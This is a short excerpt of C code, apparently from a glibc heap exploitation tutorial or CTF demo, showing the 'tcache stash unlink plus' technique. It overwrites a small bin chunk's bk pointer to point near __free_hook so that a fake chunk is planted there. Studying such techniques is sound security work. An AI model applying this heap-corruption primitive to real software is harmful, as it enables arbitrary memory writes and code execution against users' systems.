...
int main(){
	...
	malloc(size);
	malloc(size); // add in tcache stash unlink plus
	sleep(0);
	// change the small bin 2'bk to target_addr - 0x10
	*(small2 + 1) = __free_hook - 0x10;
	char *junk = __free_hook; // add in tcache stash unlink plus
	*(long long *)(junk + 8) = __free_hook + 0x100; // change in tcache stash unlink plus plus
